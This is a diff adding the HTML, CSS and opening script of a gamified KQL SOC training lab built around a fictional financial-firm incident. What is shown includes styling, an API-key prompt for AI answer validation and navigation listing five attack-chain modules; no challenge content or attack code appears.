@@ -1,0 +1,2370 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KQL SOC Training Lab — Meridian Financial Group Incident</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&family=Orbitron:wght@400;700;900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/dracula.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/sql/sql.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        :root {
+            --bg: #05080f;
+            --surface: #0b1120;
+            --surface2: #111827;
+            --surface3: #162035;
+            --border: #1c2d47;
+            --border2: #243857;
+            --cyan: #00d4ff;
+            --cyan2: #00aacc;
+            --cyan-glow: rgba(0, 212, 255, 0.15);
+            --green: #00ff88;
+            --green2: #00cc6a;
+            --green-glow: rgba(0, 255, 136, 0.1);
+            --red: #ff2b5e;
+            --red-glow: rgba(255, 43, 94, 0.15);
+            --amber: #ffb520;
+            --amber2: #cc9010;
+            --amber-glow: rgba(255, 181, 32, 0.12);
+            --purple: #a855f7;
+            --purple-glow: rgba(168, 85, 247, 0.12);
+            --text: #9cb8d4;
+            --text2: #6b8aa8;
+            --text-bright: #cde0f0;
+            --font-head: 'Orbitron', monospace;
+            --font-ui: 'Rajdhani', sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+        }
+
+        html {
+            height: 100%;
+            background: var(--bg)
+        }
+
+        body {
+            min-height: 100vh;
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--font-ui);
+            font-size: 15px;
+            background-image:
+                radial-gradient(ellipse 80% 50% at 20% 10%, rgba(0, 212, 255, 0.04) 0%, transparent 60%),
+                radial-gradient(ellipse 60% 40% at 80% 80%, rgba(168, 85, 247, 0.04) 0%, transparent 60%);
+            overflow-x: hidden;
+        }
+
+        /* Scanline overlay */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 0, 0, 0.03) 2px, rgba(0, 0, 0, 0.03) 4px);
+            pointer-events: none;
+            z-index: 9999
+        }
+
+        /* ========== MODAL ========== */
+        #apiModal {
+            position: fixed;
+            inset: 0;
+            background: rgba(5, 8, 15, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            backdrop-filter: blur(8px)
+        }
+
+        .modal-box {
+            background: var(--surface);
+            border: 1px solid var(--cyan);
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 540px;
+            width: 90%;
+            box-shadow: 0 0 60px rgba(0, 212, 255, 0.15), 0 0 120px rgba(0, 212, 255, 0.05)
+        }
+
+        .modal-logo {
+            font-family: var(--font-head);
+            color: var(--cyan);
+            font-size: 22px;
+            letter-spacing: 3px;
+            margin-bottom: 8px;
+            text-shadow: 0 0 20px var(--cyan)
+        }
+
+        .modal-sub {
+            color: var(--red);
+            font-family: var(--font-ui);
+            font-size: 13px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 28px;
+            font-weight: 600
+        }
+
+        .modal-label {
+            color: var(--text2);
+            font-size: 13px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            display: block;
+            font-weight: 600
+        }
+
+        .modal-input {
+            width: 100%;
+            background: var(--surface2);
+            border: 1px solid var(--border2);
+            border-radius: 6px;
+            padding: 12px 16px;
+            color: var(--text-bright);
+            font-family: var(--font-mono);
+            font-size: 13px;
+            outline: none;
+            transition: border .2s
+        }
+
+        .modal-input:focus {
+            border-color: var(--cyan);
+            box-shadow: 0 0 0 3px var(--cyan-glow)
+        }
+
+        .modal-hint {
+            color: var(--text2);
+            font-size: 12px;
+            margin-top: 8px;
+            line-height: 1.5
+        }
+
+        .modal-hint a {
+            color: var(--cyan);
+            text-decoration: none
+        }
+
+        .modal-btn {
+            margin-top: 24px;
+            width: 100%;
+            background: linear-gradient(135deg, var(--cyan2), var(--cyan));
+            color: #000;
+            font-family: var(--font-head);
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 3px;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all .2s
+        }
+
+        .modal-btn:hover {
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.4);
+            transform: translateY(-1px)
+        }
+
+        .modal-features {
+            margin-top: 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px
+        }
+
+        .modal-feat {
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 10px 12px;
+            font-size: 12px;
+            color: var(--text2)
+        }
+
+        .modal-feat span {
+            color: var(--cyan);
+            margin-right: 6px
+        }
+
+        /* ========== LAYOUT ========== */
+        #app {
+            display: none;
+            min-height: 100vh;
+            display: grid;
+            grid-template-rows: 64px 1fr;
+            grid-template-columns: 260px 1fr
+        }
+
+        #header {
+            grid-column: 1/-1;
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            gap: 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100
+        }
+
+        #sidebar {
+            background: var(--surface2);
+            border-right: 1px solid var(--border);
+            overflow-y: auto;
+            padding: 20px 0
+        }
+
+        #main {
+            overflow-y: auto;
+            padding: 24px
+        }
+
+        /* ========== HEADER ========== */
+        .logo {
+            font-family: var(--font-head);
+            color: var(--cyan);
+            font-size: 14px;
+            letter-spacing: 2px;
+            white-space: nowrap;
+            text-shadow: 0 0 15px rgba(0, 212, 255, 0.5)
+        }
+
+        .logo span {
+            color: var(--red)
+        }
+
+        .incident-badge {
+            background: rgba(255, 43, 94, 0.1);
+            border: 1px solid rgba(255, 43, 94, 0.4);
+            border-radius: 4px;
+            padding: 4px 10px;
+            color: var(--red);
+            font-size: 11px;
+            letter-spacing: 1px;
+            font-weight: 700;
+            animation: pulse-red 2s infinite
+        }
+
+        @keyframes pulse-red {
+
+            0%,
+            100% {
+                opacity: 1
+            }
+
+            50% {
+                opacity: .6
+            }
+        }
+
+        .progress-wrap {
+            flex: 1;
+            max-width: 400px
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            color: var(--text2);
+            font-size: 11px;
+            letter-spacing: 1px;
+            margin-bottom: 6px
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: var(--surface3);
+            border-radius: 3px;
+            overflow: hidden
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--cyan), var(--green));
+            border-radius: 3px;
+            transition: width .5s cubic-bezier(.4, 0, .2, 1)
+        }
+
+        .header-stats {
+            display: flex;
+            gap: 16px;
+            margin-left: auto
+        }
+
+        .hstat {
+            text-align: center
+        }
+
+        .hstat-val {
+            font-family: var(--font-head);
+            font-size: 16px;
+            font-weight: 700
+        }
+
+        .hstat-lbl {
+            font-size: 10px;
+            letter-spacing: 1px;
+            color: var(--text2);
+            text-transform: uppercase
+        }
+
+        /* ========== SIDEBAR ========== */
+        .sb-section {
+            padding: 12px 16px
+        }
+
+        .sb-title {
+            font-size: 10px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--text2);
+            font-weight: 600;
+            margin-bottom: 10px;
+            padding-bottom: 6px;
+            border-bottom: 1px solid var(--border)
+        }
+
+        .chain-nav {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            margin-bottom: 16px
+        }
+
+        .chain-btn {
+            background: none;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 8px 12px;
+            color: var(--text2);
+            font-family: var(--font-ui);
+            font-size: 12px;
+            text-align: left;
+            cursor: pointer;
+            transition: all .2s;
+            display: flex;
+            align-items: center;
+            gap: 8px
+        }
+
+        .chain-btn:hover {
+            border-color: var(--cyan);
+            color: var(--cyan);
+            background: var(--cyan-glow)
+        }
+
+        .chain-btn.active {
+            border-color: var(--cyan);
+            color: var(--text-bright);
+            background: rgba(0, 212, 255, 0.08)
+        }
+
+        .chain-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            flex-shrink: 0
+        }
+
+        .kql-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px
+        }
+
+        .kql-tag {
+            font-family: var(--font-mono);
+            font-size: 10px;
+            padding: 3px 7px;
+            border-radius: 4px;
+            border: 1px solid var(--border);
+            color: var(--text2);
+            transition: all .2s
+        }
+
+        .kql-tag.done {
+            background: rgba(0, 255, 136, 0.1);
+            border-color: rgba(0, 255, 136, 0.4);
+            color: var(--green)
+        }
+
+        .kql-tag.current {
+            background: rgba(0, 212, 255, 0.1);
+            border-color: var(--cyan);
+            color: var(--cyan);
+            animation: glow-pulse .8s ease-in-out infinite alternate
+        }
+
+        @keyframes glow-pulse {
+            from {
+                box-shadow: none
+            }
+
+            to {
+                box-shadow: 0 0 8px rgba(0, 212, 255, 0.4)
+            }
+        }
+
+        /* ========== CHALLENGE CARD ========== */
+        .challenge-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            transition: border-color .3s
+        }
+
+        .challenge-card.active {
+            border-color: var(--cyan);
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.08)
+        }
+
+        .card-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap
+        }
+
+        .stage-badge {
+            font-size: 10px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 20px;
+            white-space: nowrap
+        }
+
+        .diff-badge {
+            font-size: 10px;
+            padding: 3px 10px;
+            border-radius: 4px;
+            letter-spacing: 1px;
+            font-weight: 600
+        }
+
+        .diff-easy {
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--green);
+            border: 1px solid rgba(0, 255, 136, 0.3)
+        }
+
+        .diff-medium {
+            background: rgba(255, 181, 32, 0.1);
+            color: var(--amber);
+            border: 1px solid rgba(255, 181, 32, 0.3)
+        }
+
+        .diff-hard {
+            background: rgba(255, 43, 94, 0.1);
+            color: var(--red);
+            border: 1px solid rgba(255, 43, 94, 0.3)
+        }
+
+        .ch-num {
+            font-family: var(--font-head);
+            font-size: 12px;
+            color: var(--text2)
+        }
+
+        .card-title {
+            font-family: var(--font-head);
+            font-size: 17px;
+            color: var(--text-bright);
+            letter-spacing: 1px;
+            margin-left: auto;
+            flex-basis: 100%;
+            margin-top: 4px
+        }
+
+        .card-body {
+            padding: 20px
+        }
+
+        .scenario-box {
+            background: var(--surface2);
+            border-left: 3px solid var(--cyan);
+            border-radius: 0 8px 8px 0;
+            padding: 14px 16px;
+            margin-bottom: 16px;
+            line-height: 1.7;
+            color: var(--text)
+        }
+
+        .scenario-box strong {
+            color: var(--cyan);
+            font-weight: 600
+        }
+
+        .task-box {
+            background: var(--surface3);
+            border-radius: 8px;
+            padding: 14px 16px;
+            margin-bottom: 16px
+        }
+
+        .task-label {
+            font-size: 11px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--amber);
+            font-weight: 700;
+            margin-bottom: 8px
+        }
+
+        .task-text {
+            color: var(--text-bright);
+            line-height: 1.6;
+            font-size: 14px
+        }
+
+        .tables-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+            align-items: center
+        }
+
+        .tables-label {
+            font-size: 11px;
+            color: var(--text2);
+            letter-spacing: 1px
+        }
+
+        .table-chip {
+            background: rgba(168, 85, 247, 0.12);
+            border: 1px solid rgba(168, 85, 247, 0.35);
+            border-radius: 4px;
+            padding: 3px 10px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            color: var(--purple)
+        }
+
+        .cmds-row {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+            align-items: center
+        }
+
+        .cmds-label {
+            font-size: 11px;
+            color: var(--text2);
+            letter-spacing: 1px
+        }
+
+        .cmd-chip {
+            background: rgba(0, 212, 255, 0.08);
+            border: 1px solid rgba(0, 212, 255, 0.3);
+            border-radius: 4px;
+            padding: 3px 10px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            color: var(--cyan)
+        }
+
+        /* ========== EDITOR ========== */
+        .editor-label {
+            font-size: 11px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--text2);
+            font-weight: 600;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px
+        }
+
+        .editor-label::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border)
+        }
+
+        .kql-editor {
+            width: 100%;
+            min-height: 100px;
+            background: #020408;
+            border: 1px solid var(--border2);
+            border-radius: 8px;
+            padding: 14px 16px;
+            color: #a8ff78;
+            font-family: var(--font-mono);
+            font-size: 13px;
+            line-height: 1.7;
+            resize: vertical;
+            outline: none;
+            transition: border .2s;
+            tab-size: 4
+        }
+
+        .kql-editor:focus {
+            border-color: var(--cyan);
+            box-shadow: 0 0 0 2px var(--cyan-glow)
+        }
+
+        .kql-editor::placeholder {
+            color: #2a3a50
+        }
+
+        .result-label {
+            margin-top: 16px
+        }
+
+        .result-area {
+            width: 100%;
+            min-height: 80px;
+            background: #020408;
+            border: 1px solid var(--border2);
+            border-radius: 8px;
+            padding: 14px 16px;
+            color: var(--text);
+            font-family: var(--font-mono);
+            font-size: 12px;
+            line-height: 1.6;
+            resize: vertical;
+            outline: none;
+            transition: border .2s
+        }
+
+        .result-area:focus {
+            border-color: var(--amber);
+            box-shadow: 0 0 0 2px var(--amber-glow)
+        }
+
+        .result-area::placeholder {
+            color: #2a3a50
+        }
+
+        /* ========== ACTIONS ========== */
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 16px;
+            flex-wrap: wrap;
+            align-items: center
+        }
+
+        .btn {
+            font-family: var(--font-ui);
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            border: none;
+            border-radius: 6px;
+            padding: 10px 20px;
+            cursor: pointer;
+            transition: all .2s;
+            display: flex;
+            align-items: center;
+            gap: 6px
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--cyan2), var(--cyan));
+            color: #000
+        }
+
+        .btn-primary:hover {
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.35);
+            transform: translateY(-1px)
+        }
+
+        .btn-primary:disabled {
+            opacity: .4;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none
+        }
+
+        .btn-hint {
+            background: rgba(255, 181, 32, 0.12);
+            border: 1px solid rgba(255, 181, 32, 0.3);
+            color: var(--amber)
+        }
+
+        .btn-hint:hover {
+            background: rgba(255, 181, 32, 0.2);
+            box-shadow: 0 0 15px rgba(255, 181, 32, 0.2)
+        }
+
+        .btn-skip {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid var(--border);
+            color: var(--text2)
+        }
+
+        .btn-skip:hover {
+            border-color: var(--text2);
+            color: var(--text)
+        }
+
+        .btn-next {
+            background: linear-gradient(135deg, #00cc6a, var(--green));
+            color: #000
+        }
+
+        .btn-next:hover {
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.35)
+        }
+
+        /* ========== FEEDBACK ========== */
+        .feedback {
+            margin-top: 16px;
+            border-radius: 8px;
+            padding: 16px;
+            line-height: 1.6;
+            display: none;
+            animation: fadeIn .3s ease
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(8px)
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0)
+            }
+        }
+
+        .feedback.correct {
+            background: rgba(0, 255, 136, 0.07);
+            border: 1px solid rgba(0, 255, 136, 0.35);
+            color: var(--green)
+        }
+
+        .feedback.wrong {
+            background: rgba(255, 43, 94, 0.07);
+            border: 1px solid rgba(255, 43, 94, 0.35);
+            color: var(--red)
+        }
+
+        .feedback.loading {
+            background: rgba(0, 212, 255, 0.05);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            color: var(--cyan)
+        }
+
+        .feedback-icon {
+            font-size: 20px;
+            margin-bottom: 8px
+        }
+
+        .feedback-msg {
+            font-size: 14px;
+            color: var(--text-bright)
+        }
+
+        .feedback-hint {
+            margin-top: 10px;
+            font-size: 13px;
+            color: var(--amber);
+            font-family: var(--font-mono);
+            background: rgba(255, 181, 32, 0.05);
+            border-radius: 4px;
+            padding: 8px 12px;
+            border-left: 3px solid var(--amber)
+        }
+
+        .hint-box {
+            background: rgba(255, 181, 32, 0.07);
+            border: 1px solid rgba(255, 181, 32, 0.25);
+            border-radius: 8px;
+            padding: 14px 16px;
+            margin-top: 12px;
+            display: none;
+            animation: fadeIn .3s ease
+        }
+
+        .hint-box .hint-title {
+            color: var(--amber);
+            font-size: 11px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-weight: 700;
+            margin-bottom: 8px
+        }
+
+        .hint-box code {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 4px;
+            padding: 2px 6px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            color: #ffd080
+        }
+
+        /* ========== CHAIN HEADER ========== */
+        .chain-header {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px
+        }
+
+        .chain-icon {
+            font-size: 28px
+        }
+
+        .chain-name {
+            font-family: var(--font-head);
+            font-size: 16px;
+            color: var(--text-bright);
+            letter-spacing: 2px
+        }
+
+        .chain-desc {
+            font-size: 13px;
+            color: var(--text2);
+            margin-top: 2px
+        }
+
+        .chain-progress-mini {
+            margin-left: auto;
+            text-align: right
+        }
+
+        .cpm-val {
+            font-family: var(--font-head);
+            font-size: 18px;
+            color: var(--cyan)
+        }
+
+        .cpm-lbl {
+            font-size: 10px;
+            color: var(--text2);
+            letter-spacing: 1px
+        }
+
+        .ioc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 8px;
+            margin-bottom: 20px
+        }
+
+        .ioc-card {
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 12px
+        }
+
+        .ioc-type {
+            color: var(--text2);
+            font-size: 10px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+            font-weight: 600
+        }
+
+        .ioc-val {
+            font-family: var(--font-mono);
+            color: var(--red);
+            word-break: break-all
+        }
+
+        /* ========== END SCREEN ========== */
+        #endScreen {
+            display: none;
+            padding: 40px 20px;
+            text-align: center
+        }
+
+        .end-title {
+            font-family: var(--font-head);
+            font-size: 36px;
+            color: var(--cyan);
+            text-shadow: 0 0 30px var(--cyan);
+            margin-bottom: 8px
+        }
+
+        .end-sub {
+            color: var(--text);
+            margin-bottom: 32px
+        }
+
+        .end-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 12px;
+            max-width: 700px;
+            margin: 0 auto 32px
+        }
+
+        .end-stat {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px
+        }
+
+        .end-stat-val {
+            font-family: var(--font-head);
+            font-size: 28px;
+            color: var(--cyan)
+        }
+
+        .end-stat-lbl {
+            font-size: 12px;
+            color: var(--text2);
+            letter-spacing: 1px;
+            margin-top: 4px
+        }
+
+        .end-cmds {
+            max-width: 700px;
+            margin: 0 auto;
+            background: var(--surface);
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            padding: 20px
+        }
+
+        .end-cmds-title {
+            font-family: var(--font-head);
+            font-size: 13px;
+            color: var(--text);
+            letter-spacing: 2px;
+            margin-bottom: 12px
+        }
+
+        .end-cmds-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px
+        }
+
+        /* ========== LOADING SPINNER ========== */
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(0, 212, 255, 0.3);
+            border-top-color: var(--cyan);
+            border-radius: 50%;
+            animation: spin .7s linear infinite
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg)
+            }
+        }
+
+        /* ========== INTRO BANNER ========== */
+        .intro-banner {
+            background: linear-gradient(135deg, rgba(255, 43, 94, 0.08), rgba(255, 43, 94, 0.03));
+            border: 1px solid rgba(255, 43, 94, 0.25);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px
+        }
+
+        .ib-title {
+            font-family: var(--font-head);
+            color: var(--red);
+            font-size: 14px;
+            letter-spacing: 2px;
+            margin-bottom: 8px
+        }
+
+        .ib-text {
+            color: var(--text);
+            font-size: 13px;
+            line-height: 1.7
+        }
+
+        .ib-text code {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 3px;
+            padding: 1px 5px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            color: var(--cyan)
+        }
+
+        /* ========== SCROLLBAR ========== */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg)
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border2);
+            border-radius: 3px
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--cyan2)
+        }
+
+        /* ========== MISC ========== */
+        .blinking {
+            animation: blink 1s step-end infinite
+        }
+
+        @keyframes blink {
+
+            0%,
+            100% {
+                opacity: 1
+            }
+
+            50% {
+                opacity: 0
+            }
+        }
+
+        .xp-popup {
+            position: fixed;
+            font-family: var(--font-head);
+            font-size: 18px;
+            color: var(--green);
+            text-shadow: 0 0 20px var(--green);
+            pointer-events: none;
+            z-index: 5000;
+            animation: xp-fly 1.5s ease forwards
+        }
+
+        @keyframes xp-fly {
+            0% {
+                opacity: 1;
+                transform: translateY(0) scale(1)
+            }
+
+            100% {
+                opacity: 0;
+                transform: translateY(-80px) scale(1.3)
+            }
+        }
+
+        select.kql-editor {
+            font-family: var(--font-mono) !important
+        }
+
+        .expected-box {
+            background: rgba(0, 212, 255, 0.04);
+            border: 1px solid rgba(0, 212, 255, 0.15);
+            border-radius: 6px;
+            padding: 12px;
+            margin-top: 10px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            color: var(--text2);
+            line-height: 1.6
+        }
+
+        .expected-box .ex-title {
+            color: var(--cyan);
+            font-size: 10px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+            font-weight: 600
+        }
+
+        .CodeMirror {
+            background: #020408 !important;
+            color: #a8ff78 !important;
+            font-family: 'JetBrains Mono', monospace !important;
+            font-size: 13px !important;
+            line-height: 1.7 !important;
+            border-radius: 8px;
+        }
+        .CodeMirror-gutters { background: #020408 !important; border-right: 1px solid #1c2d47 !important; }
+        .CodeMirror-linenumber { color: #2a3a50 !important; }
+        .CodeMirror-cursor { border-left: 2px solid #00d4ff !important; }
+        .CodeMirror-selected { background: rgba(0,212,255,0.1) !important; }
+        
+        #challengeJump {
+            background: #0b1120;
+            border: 1px solid #1c2d47;
+            color: #9cb8d4;
+            font-family: var(--font-ui);
+            padding: 4px 24px 4px 8px;
+            border-radius: 4px;
+            font-size: 13px;
+            outline: none;
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%239cb8d4' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 6px center;
+            background-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ===== API KEY MODAL ===== -->
+    <div id="apiModal">
+        <div class="modal-box">
+            <div class="modal-logo">⚡ KQL SOC LAB</div>
+            <div class="modal-sub">🔴 ACTIVE INCIDENT — MERIDIAN FINANCIAL GROUP</div>
+            <p style="color:var(--text);font-size:13px;line-height:1.7;margin-bottom:24px">
+                5 active attack chains detected across 14 log sources. Your mission: write KQL queries in <strong
+                    style="color:var(--cyan)">Azure Data Explorer</strong>, paste your results here, and earn points as
+                Groq validates your work.
+            </p>
+            <label class="modal-label" for="apiKeyInput">🔑 Groq API Key (for answer validation)</label>
+            <input type="password" id="apiKeyInput" class="modal-input" placeholder="gsk_..." autocomplete="off">
+            <div class="modal-hint">
+                Get your free key at <a href="https://console.groq.com/keys" target="_blank">console.groq.com</a>.
+                The key is used locally to power answer validation — never stored or sent anywhere else.
+            </div>
+            <button class="modal-btn" onclick="startLab()">⚡ LAUNCH INCIDENT INVESTIGATION</button>
+            <div class="modal-features">
+                <div class="modal-feat"><span>🎯</span> 32 KQL Challenges</div>
+                <div class="modal-feat"><span>🔗</span> 5 Attack Chains</div>
+                <div class="modal-feat"><span>🤖</span> AI Validation</div>
+                <div class="modal-feat"><span>📊</span> Real Log Data</div>
+                <div class="modal-feat"><span>💡</span> Smart Hints</div>
+                <div class="modal-feat"><span>🏆</span> Progress Tracking</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== MAIN APP ===== -->
+    <div id="app" style="display:none">
+
+        <!-- HEADER -->
+        <header id="header">
+            <div class="logo">KQL<span>SOC</span>LAB</div>
+            <div class="incident-badge">🔴 LIVE INCIDENT</div>
+            <div style="display:flex;align-items:center;margin:0 16px;">
+                <span style="color:var(--amber);font-size:11px;font-family:var(--font-head);margin-right:8px;font-weight:600">GO TO:</span>
+                <select id="challengeJump" onchange="jumpToChallenge(this.value)"></select>
+            </div>
+            <div class="progress-wrap">
+                <div class="progress-label">
+                    <span id="progLabel">Challenge 0 / 32</span>
+                    <span id="progPct">0%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill" style="width:0%"></div>
+                </div>
+            </div>
+            <button id="soundToggle" onclick="toggleSound()" style="background:none;border:1px solid #1c2d47;border-radius:6px;color:#9cb8d4;padding:6px 10px;cursor:pointer;font-size:16px;margin-right:8px" title="Toggle Sound">🔊</button>
+            <button class="btn btn-skip" style="font-size:11px;padding:6px 12px" onclick="editApiKey()" title="Change API Key">🔑 Key</button>
+            <div class="header-stats">
+                <div class="hstat">
+                    <div class="hstat-val" id="scoreVal" style="color:var(--cyan)">0</div>
+                    <div class="hstat-lbl">XP</div>
+                </div>
+                <div class="hstat">
+                    <div class="hstat-val" id="correctVal" style="color:var(--green)">0</div>
+                    <div class="hstat-lbl">Correct</div>
+                </div>
+                <div class="hstat">
+                    <div class="hstat-val" id="skippedVal" style="color:var(--amber)">0</div>
+                    <div class="hstat-lbl">Skipped</div>
+                </div>
+            </div>
+        </header>
+
+        <!-- SIDEBAR -->
+        <aside id="sidebar">
+            <div class="sb-section">
+                <div class="sb-title">⚔️ Attack Chains</div>
+                <div class="chain-nav" id="chainNav">
+                    <button class="chain-btn" onclick="jumpToChain(1)"><span class="chain-dot"
+                            style="background:#00d4ff"></span>Chain 1 — BEC Phishing</button>
+                    <button class="chain-btn" onclick="jumpToChain(2)"><span class="chain-dot"
+                            style="background:#ffb520"></span>Chain 2 — Ransomware</button>
+                    <button class="chain-btn" onclick="jumpToChain(3)"><span class="chain-dot"
+                            style="background:#a855f7"></span>Chain 3 — Insider Threat</button>
+                    <button class="chain-btn" onclick="jumpToChain(4)"><span class="chain-dot"
+                            style="background:#00ff88"></span>Chain 4 — Azure Misconfig</button>
+                    <button class="chain-btn" onclick="jumpToChain(5)"><span class="chain-dot"
+                            style="background:#ff2b5e"></span>Chain 5 — Web Attack</button>
+                    <button class="chain-btn" onclick="jumpToChain(6)"><span class="chain-dot"
+                            style="background:#888"></span>⭐ Advanced KQL</button>
+                </div>
+                <div style="padding:0 16px;margin-top:8px;display:flex;gap:8px;flex-direction:column">
+                  <button class="btn btn-skip" style="width:100%;font-size:11px;color:var(--amber)" onclick="resetAllProgress()">↺ Reset All Progress</button>
+                  <button class="btn btn-skip" style="width:100%;font-size:11px;color:var(--cyan);margin-top:8px" onclick="exportReport()">📊 Export Progress Report</button>
+                </div>
+            </div>
+            <div class="sb-section">
+                <div class="sb-title">📚 KQL Commands</div>
+                <div class="kql-grid" id="kqlGrid"></div>
+            </div>
+        </aside>
+
+        <!-- MAIN CONTENT -->
+        <main id="main">
+            <div id="challengeArea"></div>
+            <div id="endScreen">
+                <div class="end-title">🎉 INVESTIGATION COMPLETE</div>
+                <div class="end-sub">You've mastered KQL and cracked all 5 attack chains at Meridian Financial Group
+                </div>
+                <div class="end-grid" id="endStats"></div>
+                <div class="end-cmds">
+                    <div class="end-cmds-title">KQL COMMANDS MASTERED</div>
+                    <div class="end-cmds-grid" id="endCmds"></div>
+                </div>
+                <button class="btn btn-primary" style="margin:24px auto;display:block" onclick="restartLab()">↺ RESTART
+                    LAB</button>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // ============================================================
+        // EMBEDDED LOG DATA
+        // ============================================================
+        const LOG_DATA = "";
+
+        // ============================================================
+        // CHALLENGE DEFINITIONS
+        // ============================================================
